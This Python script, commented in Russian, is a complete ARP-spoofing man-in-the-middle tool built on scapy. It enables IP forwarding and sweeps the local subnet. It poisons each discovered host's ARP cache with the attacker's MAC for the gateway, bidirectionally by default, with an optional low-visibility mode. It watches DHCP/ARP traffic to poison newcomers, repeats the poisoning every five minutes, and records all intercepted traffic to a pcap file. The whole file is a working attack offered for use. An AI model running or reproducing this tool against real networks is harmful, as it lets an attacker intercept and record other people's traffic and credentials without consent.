import threading
import time
import subprocess
import argparse
from scapy.all import *
import queue
from queue import Empty

from scapy.layers.dhcp import DHCP
from scapy.layers.inet import IP
from scapy.layers.l2 import ARP, Ether
from scapy.utils import PcapWriter
import os
import sys
from rich.progress import Progress

import keyboard

verbose_enabled = True
bidirectional = True
PID = os.getpid()


def check_privileges():
    if not os.environ.get("SUDO_UID") and os.geteuid() != 0:
        raise PermissionError("You need to run this script with sudo or as root.")


def get_default_if():
    if_list = get_if_list()
    if_dic = IFACES.data
    for item in if_list:
        if if_dic[item].name != "lo":
            return if_dic[item].name


def on_key_press(event):
    if event.name == 'q' or event.name == 'Q':
        print('Exiting program...')
        keyboard.unhook_all()
        global PID
        os.system(f"sudo kill -9 {PID} > /dev/null")


def arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac):
    """
  Функция для ARP-подделки.

  ARP packet configuration:
  op = 1: -- "who has pdst tell psrc" ("ip is at mac"), при отправлении пакета psrc и hwsrc не используются!
  пакет летит к target ip адресу (заранее разрешит его по arp-у сам)

  op = 2: -- "psrc адрес is at hwsrc" ("ip is at mac"), при отправлении пакета pdst и hwdst не используются!
  пакет летит к target ip адресу (заранее разрешит его по arp-у сам (если не прописан заголовок Ethernet))
  """
    arp_to_victim_packet = Ether(dst=victim_mac) / ARP(op=2, psrc=target_ip, hwsrc=spoof_mac, hwdst=victim_mac)
    sendp(arp_to_victim_packet, verbose=0, count=3)

    if bidirectional:
        arp_to_target_packet = Ether(dst=target_mac) / ARP(op=2, psrc=victim_ip, hwsrc=spoof_mac, hwdst=target_mac)
        sendp(arp_to_target_packet, verbose=0, count=3)

    if verbose_enabled:
        print(f"ARP-подделка")
        print(f"Был перехвачен кадр от {victim_ip} ({victim_mac}) -> к {target_ip} ({target_mac})")
        print(
            f"После искажения: Отправитель кадра думает, что: {target_ip} ({target_mac}) это {target_ip} ({spoof_mac})")
        if bidirectional:
            print(
                f"                 Получатель кадра  думает, что: {victim_ip} ({victim_mac}) это {victim_ip} ({spoof_mac})")
        # print(f"Для этого Отправителю был выслан кадр:", arp_to_victim_packet.show())
        # if bidirectional:
        #     print(f"Для этого Получателю был выслан кадр:", arp_to_target_packet.show())


def sniff_and_find_new_devices(interface="eth0", queue=None, pcap_name="captured_traffic.pcap"):
    """
  Функция для поиска новых устройств по DHCP и ARP,
  записи трафика в .pcap файл и передачи данных в очередь.
  """
    # Запись трафика в pcap файл
    pktdump = PcapWriter(pcap_name, append=True, sync=True)

    # Функция для обработки пакетов
    def packet_handler(packet):
        nonlocal queue

        if packet.haslayer(DHCP) or packet.haslayer(ARP):
            # Извлекаем IP и MAC адреса
            victim_ip = packet[IP].src if packet.haslayer(IP) else packet[ARP].psrc
            victim_mac = packet[ARP].hwsrc if packet.haslayer(ARP) else packet[Ether].src

            target_ip = packet[IP].dst if packet.haslayer(IP) else packet[ARP].pdst
            target_mac = packet[ARP].hwdst if packet.haslayer(ARP) else packet[Ether].dst

            # Проверяем, является ли устройство новым
            if target_ip not in queue.queue:
                # Добавляем устройство в очередь
                queue.put((victim_ip, victim_mac))
                queue.put((target_ip, target_mac))

        # Записываем пакет в pcap файл
        pktdump.write(packet)

    while True:
        try:
            # Начинаем захват пакетов
            sniff(prn=packet_handler, iface=interface, store=0)
        except OSError as e:
            print(f"Ошибка сети: {e}")
            restart_network_service()
            # Повторно пробуем инициализировать сетевой интерфейс
            try:
                restart_network_interface(interface)
                print(f"Сетевой интерфейс '{interface}' активирован.")
            except OSError as e:
                print(f"Ошибка: Не удалось активировать сетевой интерфейс '{interface}'")
                time.sleep(5)  # Ожидание перед попыткой перезапуска


def restart_network_service():
    """
  Функция для перезапуска сетевой службы Linux Networking.
  """
    try:
        subprocess.run(["systemctl", "restart", "networking"])
        print("Сетевая служба перезапущена.")
    except FileNotFoundError:
        print("Ошибка: systemctl не найден.")


def restart_network_interface(interface):
    """
  Функция для перезапуска рабочего интерфейса.
  """
    try:
        subprocess.run(["ifconfig", interface, "down"])
        subprocess.run(["ifconfig", interface, "up"])
        print("Сетевой интерфейс перезапущен.")
    except FileNotFoundError as e:
        print(f"Ошибка: {e}")


def get_gateway_mac(gateway):
    arp_packet = ARP(op=1, pdst=gateway, hwdst="ff:ff:ff:ff:ff:ff")
    ans = sr1(arp_packet, verbose=0)
    return ans.hwsrc


def network_arp_discovery(interface="eth0", gateway_ip="", gateway_mac=""):
    """
    Функция для изучения функционирующих в сети устройств, путем массовой отправки ARP-запросов,
            а также для подмены всем найденным устройствам информации о gateway.
    """
    # IP-адрес сети (например, 192.168.1.0/24)
    network = str(get_if_addr(interface)).rpartition(".")[0] + ".0/24"
    spoof_ip = get_if_addr(interface)
    spoof_mac = get_if_hwaddr(interface)

    global verbose_enabled
    __verbose_state = verbose_enabled
    verbose_enabled = False

    if __verbose_state == True:
        with Progress() as progress:
            print(f"Изучаю локальную подсеть {network}...")
            task = progress.add_task(f"[red]Изучаю локальную подсеть {network}...", total=255)
            for i in range(1, 255):
                target_ip = str(get_if_addr(interface)).rpartition(".")[0] + f".{i}"
                progress.update(task, description=f"[red]Отправляю ARP-запрос на  {target_ip}")
                arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
                                                                  psrc=spoof_ip, hwsrc=spoof_mac)

                ans, unans = srp(arp_packet, timeout=0.3, verbose=0)
                if gateway_ip != "":
                    for sent, received in ans:
                        arp_spoof(spoof_mac, received.psrc, received.hwsrc, gateway_ip, gateway_mac)

                progress.update(task, advance=1)
        os.system("clear")
    else:
        for i in range(1, 255):
            target_ip = str(get_if_addr(interface)).rpartition(".")[0] + f".{i}"
            arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
                                                              psrc=spoof_ip, hwsrc=spoof_mac)

            ans, unans = srp(arp_packet, timeout=0.3, verbose=0)
            if gateway_ip != "":
                for sent, received in ans:
                    arp_spoof(spoof_mac, received.psrc, received.hwsrc, gateway_ip, gateway_mac)
    verbose_enabled = __verbose_state
    print('Press \"q\" to exit program\n')


def main():
    check_privileges()
    default_if = get_default_if()
    # default_gateway = str(get_if_addr(default_if)).rpartition(".")[0] + ".1"

    os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null")

    parser = argparse.ArgumentParser(description="ARP-подделка с обнаружением новых устройств.")
    if len(sys.argv) == 1:
        parser.print_help()
        return
    parser.add_argument("-i", "--interface", type=str, help="Название сетевого интерфейса. Ex. eth0",
                        default=default_if, required=True)
    parser.add_argument("-g", "--gateway", type=str, help="Ip-адрес роутера", default="")
    parser.add_argument("-w", type=str, help="Файл для записи перехваченных пакетов", default="captured_traffic.pcap")
    parser.add_argument("-v", "--verbose", type=str, help="Включение расширенного вывода (True/False)", default="True")
    parser.add_argument("-q", "--quiet_mode", type=str,
                        help="Включение режима минимальной заметности в сети, а соответственно и режима однонаправленности (True/False)",
                        default="False")

    args = parser.parse_args()

    # Получаем параметры из командной строки
    interface = args.interface
    spoof_ip = get_if_addr(interface)
    spoof_mac = get_if_hwaddr(interface)
    gateway_ip = args.gateway
    if gateway_ip != "":
        gateway_mac = get_gateway_mac(gateway_ip)

    pcap_name = args.w
    global verbose_enabled
    verbose_enabled = True if str(args.verbose).lower() == 'true' else False
    quiet_mode = True if str(args.quiet_mode).lower() == 'true' else False
    if quiet_mode:
        global bidirectional
        bidirectional = False

    # Создаем очередь для передачи данных
    queue = Queue()

    # Запускаем параллельный процесс для сканирования
    sniff_thread = threading.Thread(target=sniff_and_find_new_devices, args=(interface, queue, pcap_name))
    sniff_thread.daemon = True  # Делаем поток фоновым
    sniff_thread.start()
    time.sleep(1)

    keyboard.on_press(on_key_press)
    print('Press \"q\" to exit program\n')

    # Словарь для хранения времени последней ARP-подделки для каждого устройства
    last_spoof_time = {}
    old_list = []

    if not quiet_mode:
        if gateway_ip != "":
            network_arp_discovery(interface, gateway_ip, gateway_mac)
            old_list.append(gateway_ip)
            last_spoof_time[gateway_ip] = time.time()
        else:
            network_arp_discovery(interface)

    while True:
        try:
            '''
            Отслеживаем устройства-получатели пакетов/те о которых спрашивают в сети.
            При обнаружении ARP/DHCP-пакета сообщаем в сети, что MAC-адрес получателя = MAC-адрес атакующего устройства 
            (в случае двунаправленной атаки также сообщаем в сети, что MAC-адрес отправителя = MAC-адрес атакующего устройства),
            после чего сохраняем информацию о подмененном устройстве-получателя в массив, для предупреждения постоянной отправки подменных пакетов, 
            так как в ближайшее время все устройства в сети и так будут помнить о нашей подмене.
            '''
            # Извлекаем данные из очереди
            victim_ip, victim_mac = queue.get(timeout=1)
            target_ip, target_mac = queue.get(timeout=1)
            if target_ip != spoof_ip and victim_ip != spoof_ip and target_mac != spoof_mac and victim_mac != spoof_mac:
                if target_ip not in old_list:
                    # Добавляем запрашиваемое устройство в очередь
                    old_list.append(target_ip)
                    # Отправляем ARP-подделку для нового запрашиваемого устройства сразу
                    arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac)
                    last_spoof_time[target_ip] = time.time()
                else:
                    # Проверяем время последней ARP-подделки для этого устройства
                    if target_ip in last_spoof_time and time.time() - last_spoof_time[target_ip] >= 300:
                        # Отправляем ARP-подделку, если прошло более 5 минут
                        arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac)
                        last_spoof_time[target_ip] = time.time()
        except Empty:
            # Ожидаем новые данные
            pass
        except OSError as e:
            print(f"Ошибка сети: {e}")
            restart_network_service()
            # Повторно пробуем инициализировать сетевой интерфейс
            try:
                restart_network_interface(interface)
                print(f"Сетевой интерфейс '{interface}' активирован.")
            except OSError as e:
                print(f"Ошибка: Не удалось активировать сетевой интерфейс '{interface}'")
                time.sleep(5)  # Ожидание перед попыткой перезапуска


if __name__ == "__main__":
    main()
